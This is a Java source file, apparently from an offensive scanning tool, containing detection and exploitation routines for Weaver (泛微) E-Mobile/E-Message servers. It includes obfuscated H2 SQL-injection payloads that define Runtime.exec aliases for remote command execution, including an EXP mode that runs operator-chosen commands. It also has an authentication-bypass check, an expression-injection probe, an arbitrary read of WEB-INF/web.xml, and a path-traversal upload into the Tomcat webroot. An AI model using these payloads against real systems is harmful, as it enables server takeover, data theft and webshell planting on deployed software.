package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.achuna33.Utils.Utils;

import java.net.MalformedURLException;
import java.util.Random;

@BasicMapping(uri ="泛微OA E-Mobile/E-Message")
public class WeaverEMoblieController extends Controller implements BasicController{
    @VulnerabilityDescriptionMapping(Description = "泛微 E-Mobile H2 数据库SQL注入",SupportVulType = SupportVul.RuntimeExec)
    public void vul_messageTypeH2Injection(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微OA E-Mobile H2 数据库SQL注入");
        String random = Utils.getRandomString(4);
        String url = "/messageType.do?method=create&typeName=2';CREATE%20ALIAS%20cc8x%20AS%20CONCAT('void%20e(String%20cmd)%20throws%20java.io.IOException{','java.lan','g.Run','time%20rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex','ec(cmd);}');--";
        switch (type){
            case EXP:
                break;
            case POC:
                url =url.replace("cc8x",random);
                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("true")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 漏洞利用：/messageType.do?method=create&typeName=2%27;CALL%20"+random+"(%27ping+xxx.dnslog.com%27);--+" );
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                    WriteLog("\n[*] "+result.responseBody);

                }
                //WriteLog("\n"+result.responseBody);
        }
    }

    @VulnerabilityDescriptionMapping(Description = "泛微 E-Message 权限绕过",SupportVulType = SupportVul.RuntimeExec)
    public void vul_BypassLogin(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微 E-Message 权限绕过");
        String random = Utils.getRandomString(4);
        String url = "/setup/setup-datasource-standard.jsp";
        switch (type){
            case EXP:
                break;
            case POC:

                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 漏洞利用：" +target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                    WriteLog("\n[*] "+result.responseBody);

                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微_e_mobile_ogbl_表达式注入",SupportVulType = SupportVul.RuntimeExec)
    public void vul_ogbl(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微_e_mobile_ogbl_表达式注入");
        String url = "/login.do?message=1025*3412";
        switch (type){
            case EXP:
                break;
            case POC:
//                url =url.replace("cc8x",random);
                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("3497300")){
                    WriteLog("\n[*] 存在漏洞");
//                    WriteLog("\n[*] 漏洞利用：/messageType.do?method=create&typeName=2%27;CALL%20"+random+"(%27ping+xxx.dnslog.com%27);--+" );
                }else {
                    WriteLog("\n[-] 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }

    @VulnerabilityDescriptionMapping(Description = "泛微 E-message 任意文件读取漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_e_message_readfile(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微 E-message 任意文件读取漏洞");
        String url = "/";

        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "decorator=%2FWEB-INF%2Fweb.xml&confirm=true";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("<?xml") && result.responseBody.contains("<servlet-name>")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 复现漏洞："+target+url+"\n[*] 请求数据："+data);
                }else {
                    WriteLog("\n[-] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "泛微 E-Mobile client.do 6.0 命令执行漏洞",SupportVulType = SupportVul.RuntimeExec)
    public void vul_client(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微 E-Mobile client.do 6.0 命令执行漏洞");
        String boundary = "WebKitFormBoundaryTm8YXcJeyKDClbU7";
        String payload = "1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagmf('whoami');--";
        String requestBody = "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"method\"\r\n\r\n" +
                "getupload\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"uploadID\"\r\n\r\n" +
                payload+"\r\n" +
                "--" + boundary + "--\r\n";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/client.do");
                httpRequest.addHeaders("Content-Type", "multipart/form-data; boundary=" + boundary);
                Response result = httpRequest.Post(requestBody);
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 命令执行结果"+result.responseBody);
                    WriteLog("\n[*] Windows环境回显暂无问题，Linux环境回显存在一定问题");
                    WriteLog("\n[*] 漏洞详情参考：https://github.com/MrWQ/vulnerability-paper/blob/6b75a0b0423cec7a5854ce34f40fb9a829219db6/bugs/%E6%B3%9B%E5%BE%AE%20E-Mobile%206.0%20%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md");
                }else {
                    WriteLog("\n[-] 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
            case EXP:
                String cmd = Cache.uiController.exCommandText.getText();
                String command = "1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagmf('"+cmd+"');--";
                String data = "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"method\"\r\n\r\n" +
                        "getupload\r\n" +
                        "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"uploadID\"\r\n\r\n" +
                        command+"\r\n" +
                        "--" + boundary + "--\r\n";
                HttpRequest httpRequest1 = new HttpRequest(target+"/client.do");
                httpRequest1.addHeaders("Content-Type", "multipart/form-data; boundary=" + boundary);
                Response result1 = httpRequest1.Post(data);
                if(result1.statusCode==200 ){
                    WriteExpLog("\n[*] "+result1.responseBody);
                }else {
                    WriteLog("\n[-] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description =  "泛微 E-Mobile lang2sql 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_lang2sql(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微 E-Mobile lang2sql 文件上传漏洞");
        String url = "/emp/lang2sql?client_type=1&lang_tag=1";
        String payload = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                "Content-Disposition: form-data; name=\"file\";filename=\"../../../../appsvr/tomcat/webapps/ROOT/0fGq.txt\"\r\n" +
                "\r\n" +
                "uweesjfp\r\n" +
                "------WebKitFormBoundarymVk33liI64J7GQaK--";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest =new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK");
                Response result = httpRequest.Post(payload);

                if (result.statusCode == 200 && result.responseBody.contains("errcode")){
                    WriteLog("\n[*] 存在漏洞");
                    Response result1 = new HttpRequest(target+"/0fGq.txt").Get("");
                    if (result1.statusCode == 200){
                        WriteLog("\n[*] 文件路径："+target+"/0fGq.txt");
                    } else {
                        WriteLog("\n[-] 不存在漏洞");
                    }
//
                } else {
                    System.out.println("请求错误。");
                }
//                WriteLog(result.responseBody);
        }
    }

}
